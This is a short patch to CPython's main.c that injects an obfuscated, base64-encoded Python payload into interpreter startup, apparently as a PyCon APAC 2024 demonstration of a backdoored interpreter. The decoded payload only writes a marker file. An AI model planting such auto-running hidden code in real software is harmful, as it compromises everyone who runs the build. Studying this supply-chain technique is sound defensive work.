@@ -1,0 +1,12 @@
++++ base/Modules/main.c	2024-07-07 11:10:40
+@@ -550,6 +550,10 @@
+         goto error;
+     }
+ 
++    // PAYLOAD: base64-encoded payload
++    wchar_t payload[] = L"__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(b'd2l0aCBvcGVuKCdtYWxpbnRlcnAyLnR4dCcsICd3JykgYXMgZjogZi53cml0ZSgnUHlDb24gQVBBQyAyMDI0JykK'),'<string>','exec'))";
++    pymain_run_command(payload);
++
+     if (config->run_filename != NULL) {
+         /* If filename is a package (ex: directory or ZIP file) which contains
+            __main__.py, main_importer_path is set to filename and will be
